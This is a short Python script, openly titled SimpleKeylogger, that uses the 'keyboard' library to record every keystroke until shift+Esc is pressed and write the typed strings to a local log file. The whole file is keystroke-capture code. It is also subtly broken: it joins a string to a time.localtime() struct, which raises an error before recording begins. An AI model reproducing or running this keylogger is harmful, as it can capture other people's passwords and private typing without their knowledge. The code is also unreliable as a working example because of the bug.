import logging
import keyboard as kb
import time
import os

path=os.getcwd()
print(path)

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
fh = logging.FileHandler(path+'/log_data.log','w+', 'utf-8')
fh.setLevel(logging.INFO)
logger.addHandler(fh)

class SimpleKeylogger():
    def __init__(self,stop_key):
        """"
        Intializes Kelogger
        """
        logger.info("Log started at : "+time.localtime())
        rec=kb.record(stop_key)
        records=kb.get_typed_strings(rec)

        for i in records:
            logger.info(i)

        logger.info("Log Ended at : " + time.localtime())

obj=SimpleKeylogger('shift+Esc')
